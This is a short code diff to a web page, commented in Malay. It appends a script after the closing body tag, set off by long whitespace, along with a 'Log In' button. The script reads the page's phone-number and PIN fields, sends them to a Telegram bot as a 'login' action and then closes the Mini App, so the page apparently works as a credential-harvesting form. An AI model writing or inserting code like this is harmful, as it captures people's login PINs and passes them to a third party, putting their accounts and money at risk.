@@ -183,5 +183,26 @@
     }
   </script>
 </body>
-                                                                      </html>
+              <script>
+// Fungsi hantar data ke Telegram Bot
+function hantarDataKeBot() {
+    let nombor = document.getElementById('phone').value;
+    let pin = document.getElementById('pin').value;
+    
+    // Hantar data ke bot
+    if (window.Telegram && window.Telegram.WebApp) {
+        Telegram.WebApp.sendData(JSON.stringify({
+            action: 'login',
+            phone: nombor,
+            pin: pin
+        }));
+        // Tutup Mini App & balik ke chat
+        Telegram.WebApp.close();
+    }
+}
+</script>
+
+<!-- Contoh butang yang panggil fungsi di atas -->
+<button onclick="hantarDataKeBot()">Log In</button>
+</html>
                                                                       
